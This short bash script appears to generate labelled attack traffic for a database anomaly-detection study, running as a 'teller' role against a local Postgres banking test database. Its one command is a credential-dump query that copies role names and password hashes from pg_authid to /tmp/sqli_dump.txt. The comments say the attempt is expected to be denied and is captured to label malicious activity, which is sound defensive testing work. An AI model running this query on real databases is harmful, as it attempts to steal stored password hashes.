#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_sqli_copy.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the statement is unchanged. COPY TO a server file
# needs pg_write_server_files or superuser; no banking role has it, so this is expected
# to be denied. The attempt is still captured and labelled.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: SQL injection (COPY credential dump to server file), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:sqli_copy_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';"
